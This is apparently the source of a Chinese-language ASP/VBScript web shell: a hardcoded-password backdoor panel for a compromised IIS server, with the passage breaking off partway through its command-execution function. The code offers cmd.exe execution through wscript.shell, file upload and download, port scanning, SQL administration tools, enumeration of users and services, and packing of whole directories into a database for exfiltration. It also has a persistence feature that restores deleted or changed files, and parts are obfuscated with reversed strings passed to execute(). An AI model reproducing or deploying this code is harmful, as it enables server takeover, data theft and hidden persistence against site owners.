<%@ LANGUAGE = VBScript.encode%><%
Server.ScriptTimeout=999999999
UserPass	 ="zladmin"                                       '����,ͨ��һ�仰,���ò˵����ӡ�
Copyright	 =""			'���ְ�Ȩ
eror		 =""			        '���������ʾ������
SItEuRl		 ="http://1215433511.qzone.qq.com"'			        '��Ĳ��͵�ַ
icot		 ="N"	                                        '�˴�N�ǵ�½ͼ��  ���Զ����޸Ĵ�(A-Z  a-z)
GG               ="�������й�<br>�Ұ��й�"                      '�������				 
'--------------------------------------------------------------------------------------------------
'****************************ע��*****************************************************************
htp		 ="http://odayexp.com/h4cker/mmgx/"'���ܵ�ַ �����ǧ���ܸ� ����˴�������в���
'****************************ע��*****************************************************************
'--------------------------------------------------------------------------------------------------
URL=Request.ServerVariables("URL")
OOOO=Request.ServerVariables("PATH_TRANSLATED")
ServerIP=Request.ServerVariables("LOCAL_ADDR")
Action=Request("Action")
AChar=Request("AChar")
If AChar="" Then AChar="GB2312"
RootPath=Server.MapPath(".")
WWWRoot=Server.MapPath("/")
FolderPath=Request("FolderPath")
serveru=Request.ServerVariables("http_host")
serverp=userpass
FName=Request("FName")
ex=Request("ex") 
pth=Request("pth") 
zhenz=Request("zhenz")
u=request.servervariables("http_host")&url
findbq=Request("findbq")
ASP_SELF=Request.ServerVariables("PATH_INFO") 
Addpath=Server.MapPath("\")
Const ShowFileIco=false
Response.Buffer =true
On Error Resume Next 
sub ShowErr()
  If Err Then
j"<br><a href='javascript:history.back()'><br> " & Err.Description & "</a><br>"
Err.Clear:Response.Flush
  End If
end sub
Sub j(str)
response.write(str)
End Sub
Function RePath(S)
  RePath=Replace(S,"\","\\")
End Function
Function RRePath(S)
  RRePath=Replace(S,"\\","\")
End Function
Function ShiSanFun(ShiSanObjstr)
ShiSanObjstr = Replace(ShiSanObjstr, "��", """")
For ShiSanI = 1 To Len(ShiSanObjstr)
 If Mid(ShiSanObjstr, ShiSanI, 1) <> "��" Then
ShiSanNewStr = Mid(ShiSanObjstr, ShiSanI, 1) + ShiSanNewStr
 Else
ShiSanNewStr = vbCrLf + ShiSanNewStr
 End If
Next
ShiSanFun = ShiSanNewStr
End Function
cdx="<tr><td id=d width=95 onMouseOver=""this.style.backgroundColor='#000000'"" onMouseOut=""this.style.backgroundColor='#000000'"">":
cxd="<font face='wingdings'>N</font>":
zxc=22+73:
ef="</a></td></tr>":
set fso=server.CreateObject("Scripting.FileSystemObject"):
set fsoX=server.CreateObject("Scripting.FileSystemObject"):
str1="http://"&Request.ServerVariables("SERVER_Name")& left(Request.ServerVariables("URL"),InstrRev(Request.ServerVariables("URL"),"/")):
BackUrl="<br><br><center><a href='javascript:history.back()'>����</a></center>":j"<html><meta http-equiv=""Content-Type"" content=""text/html; charset=gb2312""><title>"&Copyright&" - "&ServerIP&" </title><style type=""text/css"">body,tr,td{margin-top:5px;background-color:#000000;color:#9c9393;font-size:12px;SCROLLBAR-FACE-COLOR:#000000;scrollbar-arrow-color:#000000;scrollbar-highlight-color:#000000;scrollbar-3dlight-color:#dddddd;scrollbar-shadow-color:#232323}.sb{cursor:hand}input,select,textarea{border-top-width:1px;font-weight: bold;border-left-width: 1px;font-size:11px;border-left-color: #dddddd;background: #000000;border-bottom-width: 1px;border-bottom-color: #dddddd;color: #dddddd;border-top-color: #dddddd;font-family: verdana;border-right-width: 1px;border-right-color: #dddddd;}#d{background: #000000;padding-left:5px;padding-right:5px}pre{font-size: 11px;font-family: verdana;color: #dddddd;}hr{color: #dddddd;background-color: #dddddd;height: 5px;}#x{font-family: verdana;font-size:13px}a{color:#b4a9a9;text-decoration:none;}.am{color:#b4a9a9;font-size:11px;}</style>"
j "<script>":j"function killErrors(){return true;}window.onerror=killErrors;function yesok(){if (confirm(""ȷ��Ҫִ�д˲�����""))return true;else return false;}function runClock(){theTime = window.setTimeout(""runClock()"", 100);var today = new Date();var display= today.toLocaleString();window.status=""��"&Copyright&"  --""+display;}runClock();function ShowFolder(Folder){top.addrform.FolderPath.value = Folder;top.addrform.submit();}function FullForm(FName,FAction){top.hideform.FName.value = FName;if(FAction==""CopyFile""){DName = prompt(""�����븴�Ƶ�Ŀ���ļ�ȫ����"",FName);top.hideform.FName.value += ""||||""+DName;}else if(FAction==""MoveFile""){DName = prompt(""�������ƶ���Ŀ���ļ�ȫ����"",FName);top.hideform.FName.value += ""||||""+DName;}else if(FAction==""CopyFolder""){DName = prompt(""�������ƶ���Ŀ���ļ���ȫ����"",FName);top.hideform.FName.value += ""||||""+DName;}else if(FAction==""MoveFolder""){DName = prompt(""�������ƶ���Ŀ���ļ���ȫ����"",FName);top.hideform.FName.value += ""||||""+DName;}else if(FAction==""NewFolder""){DName = prompt(""������Ҫ�½����ļ���ȫ����"",FName);top.hideform.FName.value = DName;}else{DName = ""Other"";}if(DName!=null){top.hideform.Action.value = FAction;top.hideform.submit();}else{top.hideform.FName.value = """";}}</script>":j"<body" ::If Action="" then j " scroll=no":j ">"
Dim ObT(19,2):
Fn=Action:ObT(0,0) = "Scripting.FileSystemObject":
ObT(0,2) = "�� �� �� �� �� ��":
ObT(1,0) = "wscript.shell":
ObT(1,2) = "������ִ�����":
ObT(2,0) = "ADOX.Catalog":
ObT(2,2) = "ACCESS �� �� �� ��":
ObT(3,0) = "JRO.JetEngine":
ObT(3,2) = "ACCESS ѹ �� �� ��":
ObT(4,0) = "Scripting.Dictionary":
ObT(4,2) = "������ �� �� ���� ���":
ObT(5,0) = "Adodb.connection":
ObT(5,2) = "���ݿ� ���� ���":
ObT(6,0) = "Adodb.Stream":
ObT(6,2) = "������ �ϴ� ���":
ObT(7,0) = "SoftArtisans.FileUp":
ObT(7,2) = "SA-FileUp �ļ� �ϴ� ���":
ObT(8,0) = "LyfUpload.UploadFile":
ObT(8,2) = "���Ʒ� �ļ� �ϴ� ���":
ObT(9,0) = "Persits.Upload.1":
ObT(9,2) = "ASPUpload �ļ� �ϴ� ���":
ObT(10,0) = "JMail.SmtpMail":
ObT(10,2) = "JMail �ʼ� �շ� ���":
ObT(11,0) = "CDONTS.NewMail":
ObT(11,2) = "����SMTP ���� ���":
ObT(12,0) = "SmtpMail.SmtpMail.1":
ObT(12,2) = "SmtpMail ���� ���":
ObT(13,0) = "Microsoft.XMLHTTP":
ObT(13,2) = "���� ���� ���"
ObT(14,0) = "ws"&"cript.shell.1":  
OBt(14,2) = "���wsh���������Ը���������":
OBT(15,0) = "WS"&"CRIPT.NETWORK":  
OBt(15,2) = "�鿴��������Ϣ���������ʱ����������Ȩ":
OBT(16,0) = "she"&"ll.appl"&"ication":
OBt(16,2) = "she"&"ll.appli"&"cation ��������FSOʱ�����ļ��Լ�ִ������":
OBT(17,0) = "sh"&"ell.appl"&"ication.1":
OBt(17,2) = "she"&"ll.appli"&"cation �ı�������FSOʱ�����ļ��Լ�ִ������":
OBT(18,0) = "Shell.Users":OBt(18,2) = "ɾ����net.exe net1.exe�����������û������":OBT(19,0) = "MSXML2.ServerXMLHTTP":OBt(19,2) = "MSXML2.ServerXMLHTTP"
For i=0 To 19:Set T=Server.CreateObject(ObT(i,0)):If -2147221005 <> Err Then:IsObj=" ��":Else:IsObj=" ��":Err.Clear:End If:Set T=Nothing:ObT(i,1)=IsObj:Next:If FolderPath<>"" then:Session("FolderPath")=RRePath(FolderPath):End If:If Session("FolderPath")="" Then:FolderPath=WwwRoot:Session("FolderPath")=FolderPath:End if:
j"</form><script>function RUNonclick(){document.xform.china.name = parent.pwd.value;document.xform.action = parent.url.value;document.xform.submit();}</script>"
mm=ShowErrs
Function StreamLoadFromFile(sPath)
Dim oStream
Set oStream = Server.CreateObject("Adodb.Stream")
With oStream
.Type = 1
.Mode = 3
.Open
.LoadFromFile(sPath)
.Position = 0
StreamLoadFromFile = .Read
.Close
End With
Set oStream = Nothing
End Function
Function MainForm() 
execute(shisanfun("��>elbat/<>rt/<>dt/<��j���>emarfi/<>'1'=redrobemarf '%001'=thgieh '%001'=htdiw 'eliF1wohS=noitcA?'=crs 'emarFeliF'=eman emarfi<��j���>'%011'=htdiw dt<��j���>dt/<>emarfi/<>'0'=redrobemarf '%001'=thgieh '%001'=htdiw 'uneMniaM=noitcA?'=crs 'tfeL'=eman emarfi<��j:��>'%31'=htdiw dt<>rt<>rt/<>dt/<>retnec/<>elbat/<>mrof/<>rt/<>dt/<��j���>dt<>dt/<��>a/<stnemucoD>')���\\stnemucoD\\sresU llA\\sgnitteS dna stnemucoD\\:C���(redloFwohS:tpircsavaj'=ferh a<����>a/<pmeT>')���\\pmeT\\swodniw\\:c���(redloFwohS:tpircsavaj'=ferh a<����>a/<atad>')���\\atad\\vrsteni\\23metsys\\SWODNIW\\:c���(redloFwohS:tpircsavaj'=ferh a<����>a/<gifnoc>')���\\gifnoc\\23metsys\\SWODNIW\\:C���(redloFwohS:tpircsavaj'=ferh a<����>a/<LQS>')���\\revreS LQS tfosorciM\\seliF margorP\\:C���(redloFwohS:tpircsavaj'=ferh a<����>a/<revreSlaeR>')���laeR\\seliF margorP\\:C���(redloFwohS:tpircsavaj'=ferh a<����>a/<u-vres>')���\\u-vres\\seliF margorP\\:c���(redloFwohS:tpircsavaj'=ferh a<����>a/<erehwynAcp>')���\\erehwynAcp\\cetnamyS\\ataD noitacilppA\\sresU llA\\sgnitteS dna stnemucoD\\:C���(redloFwohS:tpircsavaj'=ferh a<����>a/<RELCYCER\:D>')���\\RELCYCER\\:D���(redloFwohS:tpircsavaj'=ferh a<����>a/<RELCYCER\\:C>')���\\RELCYCER\\:C���(redloFwohS:tpircsavaj'=ferh a<����>a/<��� >b/<��>b< ʼ��>')���\\���\\���ˡ�ʼ����\\sresU llA\\sgnitteS dna stnemucoD\\:C���(redloFwohS:tpircsavaj'=ferh a<����>a/<sresUllA>')���\\sresU llA\\sgnitteS dna stnemucoD\\:C���(redloFwohS:tpircsavaj'=ferh a<����>a/<margorP>')���seliF margorP\\:C���(redloFwohS:tpircsavaj'=ferh a<����¼ĿȨ�� >rt<��j���>'elddim'=ngilav 'retnec'=ngila rt<  ��j�� ��>')(daoler.noitacol.emarFeliF'=kcilcno '��ˢ'=eulav 'timbus'=epyt tupni< >'��ת'=eulav 'timbus'=epyt 'timbuS'=eman tupni<>'retnec'=ngila '041'=htdiw dt<>dt/<��j���>'��&)��htaPredloF��(noisseS&��'=eulav '%001:htdiw'=elyts 'htaPredloF'=eman tupni<��j���>dt<>dt/<����ַ��>'retnec'=ngila '06'=htdiw dt<>rt<��j���>'tnerap_'=tegrat '��&LRU&��'=noitca 'tsop'=dohtem 'mrofrdda'=eman mrof<��j���>'%001'=htdiw elbat<��j���>'2'=napsloc '03'=thgieh dt<>rt<��j���>'0'=gnicapsllec '0'=gniddapllec 0=redrob  '%001'=thgieh '%001'=htdiw elbat<��j���>mrof/<��j���>���emaNF���=eman ���neddih���=epyt tupni<��j���>���noitcA���=eman ���neddih���=epyt tupni<��j���>���emarFeliF���=tegrat ����&LRU&����=noitca ���tsop���=dohtem ���mrofedih���=eman mrof<��j"))
End Function
servrer="<br><br><br><center>�������̶�ʧ����<a href="&URL&" style=""text-decoration:underline;font-weight:bold"">��������</a>�������̡�</center>"
Sub PageAddToMdb()
Dim theAct, thePath
theAct = Request("theAct")
thePath = Request("thePath")
Server.ScriptTimeOut=100000
If theAct = "addToMdb" Then
addToMdb(thePath)
j "<div align=center><br>�������!</div>"&BackUrl
Response.End
End If
If theAct = "releaseFromMdb" Then
unPack(thePath)
j "<div align=center><br>�������!</div>"&BackUrl
Response.End
End If
j"<br>�ļ��д��:<form method=post><input type=hidden name=""#"" value=Execute(Session(""#""))><input name=thePath value=""" & HtmlEncode(Server.MapPath(".")) & """ size=80><input type=hidden value=addToMdb name=theAct><select name=theMethod><option value=fso>FSO</option><option value=app>��FSO</option></select><input type=submit value='��ʼ���'><br><br>ע: �������HSH.mdb�ļ�,λ��samľ��ͬ��Ŀ¼��</form><hr/>�ļ����⿪(��FSO֧��):<br/><form method=post><input type=hidden name=""#"" value=Execute(Session(""#""))><input name=thePath value=""" & HtmlEncode(Server.MapPath(".")) & "\HSH.mdb"" size=80><input type=hidden value=releaseFromMdb name=theAct><input type=submit value='�⿪��'><br><br>ע: �⿪���������ļ���λ�ڱ�����Ŀ¼��</form>"
End Sub
Sub addToMdb(thePath)
On Error Resume Next
Dim rs, conn, stream, connStr, adoCatalog
Set rs = Server.CreateObject("ADODB.RecordSet")
Set stream = Server.CreateObject("ADODB.Stream")
Set conn = Server.CreateObject("ADODB.Connection")
Set adoCatalog = Server.CreateObject("ADOX.Catalog")
connStr = "Provider=Microsoft.Jet.OLEDB.4.0; Data Source=" & Server.MapPath("HSH.mdb")
adoCatalog.Create connStr
conn.Open connStr
conn.Execute("Create Table FileData(Id int IDENTITY(0,1) PRIMARY KEY CLUSTERED, thePath VarChar, fileContent Image)")
stream.Open
stream.Type = 1
rs.Open "FileData", conn, 3, 3
If Request("theMethod") = "fso" Then
fsoTreeForMdb thePath, rs, stream
 Else
saTreeForMdb thePath, rs, stream
End If
rs.Close
Conn.Close
stream.Close
Set rs = Nothing
Set conn = Nothing
Set stream = Nothing
Set adoCatalog = Nothing
End Sub
Function fsoTreeForMdb(thePath, rs, stream)
Dim item, theFolder, folders, files, sysFileList
sysFileList = "$HSH.mdb$HSH.ldb$"
If Server.CreateObject("Scripting.FileSystemObject").FolderExists(thePath) = False Then
showErr(thePath & " Ŀ¼�����ڻ��߲��������!")
End If
Set theFolder = Server.CreateObject("Scripting.FileSystemObject").GetFolder(thePath)
Set files = theFolder.Files
Set folders = theFolder.SubFolders
For Each item In folders
fsoTreeForMdb item.Path, rs, stream
Next
For Each item In files
If InStr(sysFileList, "$" & item.Name & "$") <= 0 Then
rs.AddNew
rs("thePath") = Mid(item.Path, 4)
stream.LoadFromFile(item.Path)
rs("fileContent") = stream.Read()
rs.Update
End If
Next
Set files = Nothing
Set folders = Nothing
Set theFolder = Nothing
set fso=nothing
End Function
Sub unPack(thePath)
On Error Resume Next
Server.ScriptTimeOut=100000
Dim rs, ws, str, conn, stream, connStr, theFolder
str = Server.MapPath(".") & "\"
Set rs = CreateObject("ADODB.RecordSet")
Set stream = CreateObject("ADODB.Stream")
Set conn = CreateObject("ADODB.Connection")
connStr = "Provider=Microsoft.Jet.OLEDB.4.0;Data Source=" & thePath & ";"
conn.Open connStr
rs.Open "FileData", conn, 1, 1
stream.Open
stream.Type = 1
Do Until rs.Eof
theFolder = Left(rs("thePath"), InStrRev(rs("thePath"), "\"))
If Server.CreateObject("Scripting.FileSystemObject").FolderExists(str & theFolder) = False Then
createFolder(str & theFolder)
End If
stream.SetEos()
stream.Write rs("fileContent")
stream.SaveToFile str & rs("thePath"), 2
rs.MoveNext
Loop
rs.Close
conn.Close
stream.Close
Set ws = Nothing
Set rs = Nothing
Set stream = Nothing
Set conn = Nothing
End Sub
Sub createFolder(thePath)
Dim i
i = Instr(thePath, "\")
Do While i > 0
If Server.CreateObject("Scripting.FileSystemObject").FolderExists(Left(thePath, i)) = False Then
Server.CreateObject("Scripting.FileSystemObject").CreateFolder(Left(thePath, i - 1))
End If
If InStr(Mid(thePath, i + 1), "\") Then
i = i + Instr(Mid(thePath, i + 1), "\")
 Else
i = 0
End If
Loop
End Sub
Sub saTreeForMdb(thePath, rs, stream)
Dim item, theFolder, sysFileList
sysFileList = "$HSH.mdb$HSH.ldb$"
Set theFolder = saX.NameSpace(thePath)
For Each item In theFolder.Items
If item.IsFolder = True Then
saTreeForMdb item.Path, rs, stream
 Else
If InStr(sysFileList, "$" & item.Name & "$") <= 0 Then
rs.AddNew
rs("thePath") = Mid(item.Path, 4)
stream.LoadFromFile(item.Path)
rs("fileContent") = stream.Read()
rs.Update
End If
End If
Next
Set theFolder = Nothing
End Sub
Function ProFile()
If Request("Action2")="Post" Then
Randomize
dim pass2,num1
pass2=""
Do While Len(pass2)<8
if Len(pass2)<=4 then
num1=CStr(Chr((122-97)*rnd+97)) 'a~z 
else
num1=CStr(Chr((57-48)*rnd+48)) '0~9 
end if
pass2=pass2&num1
loop 
pass2=ucase(pass2)
Application(pass2)=1
Application(pass2&"File")=request("AFile")
Application(pass2&"Code")=request("ACode")
Application(pass2&"Time")=request("ATime")
Application(pass2&"Char")=request("AChar")
j"<br><br><br><center>�������� <font color=yellow>"&pass2&"</font> ���ɳɹ������<a style=""text-decoration:underline;font-weight:bold"" href="&URL&"?ProFile="&pass2&" target=_blank>����</a>�������̡�</center><br>"
Response.End
End If
SI="<br><table border='0' cellpadding='0' cellspacing='0'>"
SI=SI&"<form name='UpForm' method='post' action='"&URL&"?Action=ProFile&Action2=Post'"
SI=SI&"<tr><td valign=top style='line-height:22px' align=right><input type=""hidden"" name=""vvva"" value=""0"">��Ҫ�������ļ�·����<br><font color=yellow>��ͬʱ��������ļ�&nbsp;&nbsp;<br>ÿ��һ���ļ�·��&nbsp;&nbsp;</font></td><td>"
SI=SI&"<textarea name=""AFile"" cols=""70"" rows=""7"">"&RRePath(Session("FolderPath")&"\test.asp")&"</textarea></td></tr>"
SI=SI&"<tr><td valign=top style=""padding-top:3px;"" align=right>�ļ����룺</td><td><textarea name=""ACode"" cols=""70"" rows=""7"">�ļ�����</textarea></td></tr>"
SI=SI&"<tr><td align=right>�ļ����룺</td><td><input type=""radio"" name=""AChar"" value=""1"" checked />GB2312  <input type=""radio"" name=""AChar"" value=""2"" />UTF-8 (�����ļ����������룬�볢�Ը��ı���)</td></tr>"
SI=SI&"<tr><td align=right>����Ƶ�ʣ�</td><td><input type=""text"" name=""ATime"" style=""text-align:right"" value=""1"" size=""5"" onkeyup=""value=value.replace(/[^\d]/g,'')"" /> �� (��СΪ1�룬��Ҫ�������ļ�Խ�࣬Ƶ������Խ�󣬷����޷�ȫ������)</td></tr>"
SI=SI&"<tr><td>&nbsp;</td><td height=50><input type='submit' name='Submit' value='��һ�������ɱ�������'></td></tr>"
SI=SI&"</form></table>"
j SI
End Function
if request("ProFile")<>"" then
on error resume next
if Application(request("ProFile"))=1 then
Set fsoXX = Server.CreateObject("Scripting.FileSystemObject")
if request("DelCon")=1 then
Application(request("ProFile")&"Con")=""
response.redirect Url&"?ProFile="&request("ProFile")&""
response.end
end if
DIM rline,rline2
rline2=Application(request("ProFile")&"Code")
rline2=rline2&vbcrlf
j"<meta http-equiv=""refresh"" content="&Application(request("ProFile")&"Time")&">"
j"<a href="&Url&"?ProFile="&request("ProFile")&"&DelCon=1><b>�����־</b></a> &nbsp;<font color=yellow>Ҫ����������ֱ�ӹر�ҳ�漴�ɡ�</font><br>"
for each FileUrl in split(Application(request("ProFile")&"File"),vbcrlf)
FileUrl=trim(FileUrl)
if fsoXX.FileExists(FileUrl) then
Set txt = fsoXX.OpenTextFile(FileUrl,1,true)
rline=""
if Not txt.AtEndOfStream then
rline=txt.ReadAll  
end if
if rline2<>rline then
txt.close
fsoX.GetFile(FileUrl).Attributes=32
if Application(request("ProFile")&"Char")=1 then
set myfileee = fsoXX.CreateTextFile(FileUrl,true)
else
set myfileee = fsoXX.CreateTextFile(FileUrl,true,true)
end if
myfileee.writeline Application(request("ProFile")&"Code")
Application(request("ProFile")&"Con")=now()&" "&FileUrl&" <font color=yellow>�����ģ��ѻָ�</font><br>"&Application(request("ProFile")&"Con")
else
Application(request("ProFile")&"Con")=now()&" "&FileUrl&" ��<br>"&Application(request("ProFile")&"Con")
txt.close
end if
else
if Application(request("ProFile")&"Char")=1 then
set myfileee = fsoXX.CreateTextFile(FileUrl,true)
else
set myfileee = fsoXX.CreateTextFile(FileUrl,true,true)
end if
myfileee.writeline Application(request("ProFile")&"Code")
Application(request("ProFile")&"Con")=now()&" "&FileUrl&" <font color=red>��ɾ�����ѻָ�</font><br>"&Application(request("ProFile")&"Con")
end if
next
if ubound(split(Application(request("ProFile")&"Con"),"<br>"))>=40 then
dim ashowic
for ashowi=0 to 40
ashowic=ashowic&split(Application(request("ProFile")&"Con"),"<br>")(ashowi)&"<br>"
next
Application(request("ProFile")&"Con")=ashowic
end if
j Application(request("ProFile")&"Con")
else
j servrer
if request("ProFile")=AChar then il x (mm)
end if
response.end
end if
Function MainMenu()
j"<script language=javascript>function MM_show(s){if (document.getElementById(s).style.display==""""){document.getElementById(s).style.display=""none"";}else{document.getElementById(s).style.display="""";}}</script><table width='100%' cellspacing='0' cellpadding='0'><tr><td height='5'></td></tr><tr><td><center><font color=#000000><font size=1.0>"&mName&"</font></font></center></td></tr>":If ObT(0,1)=" ��" Then
:j"<tr><td height='24'>��Ȩ��</td></tr>"
:Else:
j"<tr><td onClick=""MM_show('menud')""><input onMouseOver=""this.style.cursor='hand'"" type=button value='��Ӳ��__�ļ�����'></td></tr><tr><td height=4></td></tr><tr><td valign=""top"" align=center><table border=0  id=menud style=""display='none'"">"
Set ABC=New LBF:j ABC.ShowDriver():Set ABC=Nothing:
j"</table></td></tr><tr><td valign=""top"" align=center><table border=0><tr><td id=d width=95 onMouseOver=""this.style.backgroundColor='#000000'"" onMouseOut=""this.style.backgroundColor='#000000'""><a href='javascript:ShowFolder("""&RePath(WWWRoot)&""")'><font face='wingdings'>N</font> վ���Ŀ¼"&ef
j cdx&"<a href='javascript:ShowFolder("""&RePath(RootPath)&""")'>"&cxd&" ������Ŀ¼"&ef
j cdx&"<a href='?Action=goback' target='FileFrame'>"&cxd&" ���ϼ�Ŀ¼"&ef
j cdx&"<a href='javascript:FullForm("""&RePath(Session("FolderPath")&"\Newfile")&""",""NewFolder"")'>"&cxd&" �½�--Ŀ�"&ef
j cdx&"<a href='?Action=EditFile' target='FileFrame'>"&cxd&" �½�--�ı�"&ef
j cdx&"<a href='?Action=UpFile' target='FileFrame'>"&cxd&" �ϴ�--�ļ�"&ef
j cdx&"<a href='?Action=Cmd1Shell' target='FileFrame'>"&cxd&" ִ��---CMD"&ef
j cdx&"<a href='?Action=ScanDriveForm' target='FileFrame'>"&cxd&" ��д--Ŀ¼"&ef
j cdx&"<a href='?Action=php' target='FileFrame'>"&cxd&" �ű�--̽��"&ef
j cdx&"<a href='?Action=PageAddToMdb' target='FileFrame'>"&cxd&" ���������"&ef

j cdx&"<a href='?Action=DbManager' target='FileFrame'>"&cxd&" �������ݿ�"&ef
j "</table></td></tr>"
End If:
j"</tr><tr></tr><tr><td onClick=""MM_show('menuc')""><input onMouseOver=""this.style.cursor='hand'""  type=button value='����Ϣ__�ռ���'></td></tr><tr></tr><tr><td valign=""top"" align=center><table border=0  id=menuc style=""display='none'"">"
j cdx&"<a href='?Action=Course' target='FileFrame'>"&cxd&" �û�__�˺�"&ef
j cdx&"<a href='?Action=getTerminalInfo' target='FileFrame'>"&cxd&" �˿�__����"&ef
j cdx&"<a href='?Action=Alexa' target='FileFrame'>"&cxd&" ���__֧��"&ef
j cdx&"<a href='?Action=MMD' target='FileFrame'>"&cxd&" SQL-----SA"&ef
j cdx&"<a href='?Action=sql' target='FileFrame'>"&cxd&" SQL---����"&ef
j cdx&"<a href='?Action=ScanPort' target='FileFrame'>"&cxd&" �˿�ɨ����"&ef
j cdx&"<a href='?Action=TSearch' target='FileFrame'>"&cxd&" ����__�ļ�"&ef&"</tr></table>"
j"<hr><tr><td><input  type=button value='������__���ܡ�'></td</tr><tr><td height=4></td></tr><tr><td align=center><table border=0>"
j cdx&"<a href='?Action=EditPower&PowerPath=\\.\"&OOOO&"' target='FileFrame'>"&cxd&" ����������"&ef
j cdx&"<a href='javascript:FullForm("""&RePath(Session("FolderPath")&"\vti_cnf..\\")&""",""NewFolder"")'>"&cxd&"  <font color=red>������Ŀ¼</font>"&ef
j cdx&"<a href='?Action=datess' target='FileFrame'>"&cxd&" ����--ʱ��"&ef
j cdx&"<a href='?Action=ProFile' target='FileFrame'>"&cxd&" �ļ�--����"&ef
j cdx&"<a href='?Action=hiddenshell' target='_blank'>"&cxd&" <font color=red>����--��ʬ</font>"&ef
j cdx&"<a href='http://www.114best.com/ip/114.aspx?w="&serveru&"' target='FileFrame'>"&cxd&" ͬ��--��ѯ"&ef
j cdx&"<a href='http://odayexp.com/h4cker/pr/pr.asp?"&serveru&"' target='FileFrame'>"&cxd&"  PRֵ--��ѯ"&ef
j cdx&"<a href='http://odayexp.com/h4cker/mssql/' target='FileFrame'>"&cxd&"  ����--����"&ef
j cdx&"<a href='http://h4ck2b.com/web/Updates.asp' target='FileFrame'>"&cxd&" ����--����"&ef
j cdx&"<a href='?Action=Logout' target='_top'>"&cxd&" �˳�--��½</a></td></tr></hr></table>"
j "<tr><td><center><font color=#3399FF>----------------<br><img src=""http://www.aizhan.com/getbr.php?url="&u&"&style=2""></img><br>----------------<br><img src='http://h4ck2b.com/web/pr/?"&u&"'></img><br>----------------<br>"&GG&"</font></center>"
'�ٶ�Ȩ�ص�ַ����
'PRֵ���õ�ַ
end function:
Function Course()
SI="<br><table width='80%' align='center'><tr><td height='20' colspan='3' align='center' id=s><b>ϵͳ�û������</b></td></tr>"
on error resume next
for each obj in getObject("WinNT://.")
err.clear
if OBJ.StartType="" then
SI=SI&"<tr><td height=""20"" id=d>&nbsp;"&obj.Name&"</td><td id=d>&nbsp;ϵͳ�û�(��)</td></tr><tr>" 
end if
if OBJ.StartType=2 then lx="�Զ�"
if OBJ.StartType=3 then lx="�ֶ�"
if OBJ.StartType=4 then lx="����"
if LCase(mid(obj.path,4,3))<>"win" and OBJ.StartType=2 then
SI1=SI1&"<tr><td height=""20"" id=d>&nbsp;"&obj.Name&"</td><td height=""20"" id=d>&nbsp;"&obj.DisplayName&"<tr><td height=""20"" id=d colspan=""2"">[��������:"&lx&"]<font>&nbsp;"&obj.path&"</font></td></tr>"
else
SI2=SI2&"<tr><td height=""20"" id=d>&nbsp;"&obj.Name&"</td><td height=""20"" id=d>&nbsp;"&obj.DisplayName&"<tr><td height=""20"" bgcolor="""" colspan=""2"">[��������:"&lx&"]<font color=#3399FF>&nbsp;"&obj.path&"</font></td></tr>"
end if
next
j SI&SI0&SI1&SI2&"</table>"
End Function
Function GetTheSizes(num)
Dim i, arySize(4)
arySize(0)="B"
arySize(1)="KB"
arySize(2)="MB"
arySize(3)="GB"
arySize(4)="TB"
While(num / 1024 >= 1)
num=Fix(num / 1024 * 100) / 100
i=i + 1
WEnd
GetTheSizes=num&" "&arySize(i)
End Function
Function HtmlEncodes(str)
If IsNull(str) Then Exit Function
HtmlEncodes=Server.HTMLEncode(str)
End Function
Function lIl(stvb, nType, tru)

    If stvb = "" or IsNull(stvb) Then
        lIl = stvb
        Exit Function
    End If
    Dim SText, saText, aText, MText
    Dim itru, Midtru, Lentru, GetTextLen
    Lentru = Len(tru)
    For aText = 1 To Len(stvb)
        MText = LCase(Mid(stvb,aText,1))
        saText = False
        For itru = 1 To Lentru
            Midtru = LCase(Mid(tru,itru,1))
            If MText = Midtru Then
                saText = True
                GetTextLen = 0
               			If itru = 1 Then
                        GetTextLen = Lentru
                    Else
                        GetTextLen = itru - 1
                    End If

                SText = Mid(tru,GetTextLen,1) & SText
                Exit For
            End If
        Next
        If saText = False Then
            SText = MText & SText
        End If
    Next
    lIl = SText
End Function
function downfile(path)
response.clear
set osm = createobject(obt(6,0))
osm.open
osm.type = 1
osm.loadfromfile path
sz=instrrev(path,"\")+1
response.addheader "content-disposition", "attachment; filename=" & mid(path,sz)
response.addheader "content-length", osm.size
response.charset = "utf-8"
response.contenttype = "application/octet-stream"
response.binarywrite osm.read
response.flush
osm.close
set osm = nothing
end function
function htmlencode(s)
  if not isnull(s) then
    s = replace(s, ">", ">")
    s = replace(s, "<", "<")
    s = replace(s, chr(39), "'")
    s = replace(s, chr(34), """")
    s = replace(s, chr(20), " ")
    htmlencode = s
  end if
end function
Function UpFile()
 If Request("Action2")="Post" Then
Set U=new UPC 
Set F=U.UA("LocalFile")
UName=U.form("ToPath")
 If UName="" Or F.FileSize=0 then
  SI="<br>����"&"����"&"��"&"����ȫ"&"·����ѡ��"&"һ���ļ�"&"��"&"��!<br><br><br>"
on error resume next
  Else
 F.SaveAs UName
 If Err.number=0 Then
 SI="<center><br><br><br>��"&"��"&"��"&"��"&"�ɹ���"&UName&"</center>"
  End if
 End If
Set F=nothing
Set U=nothing
 SI=SI&BackUrl
if instr(UName,wwwroot)>0 then
j "<a href=http://"&serveru&replace(replace(UName,wwwroot,""),"\","/")&" target=_blank>��http://"&serveru&replace(replace(UName,wwwroot,""),"\","/")&"</a>"
end if
 j SI
ShowErr()
Response.End
  End If
  j"<br><br><br><table border='0' cellpadding='0' cellspacing='0' align='center'><form name='UpForm' method='post' action='"&URL&"?Action=UpFile&Action2=Post' enctype='multipart/form-data'><tr><td>ע�⣺Ĭ���ϴ�����Ŀ¼�����Ǳ�����Ŀ¼��<br><br><br>��"&"��·"&"����<input name='ToPath' value='"&RRePath(Session("FolderPath")&"\Cmd.exe")&"' size='40'><input name='LocalFile' type='file'  size='25'> <input type='submit' name='Submit' value='��"&"��'></td></tr></form></table>"
End Function
function cmd1shell():on error resume next
if request("sp")<>"" then session("shellpath") = request("sp")
shellpath=session("shellpath")
if shellpath="" then shellpath = "cmd.exe"
if request("cmd")<>"" then session("defcmd") = request("cmd")
defcmd=session("defcmd")
if defcmd="" then defcmd="set"
if request("rwpath")<>"" then session("rwpath") = request("rwpath")
rwpath=session("rwpath")
if rwpath="" then rwpath=server.mappath(".")
si="<form method='post'>"
rp1="<input type=""radio"" name=""cmdtype"" value="""
si=si&"cmd·����<input name='sp' value='"&shellpath&"' style='width:35%'>  �ɶ�дĿ¼(���ڻ���)<input name='rwpath' value='"&rwpath&"' style='width:35%'><br>"
si=si&"<input type='hidden' name='action' value='Cmd1Shell'>"
si=si&rp1&"wscript"" checked>wscript"
si=si&rp1&"wscript.shell"">wscript.shell"
si=si&rp1&"wscript.shell.1"">wscript.shell.1"
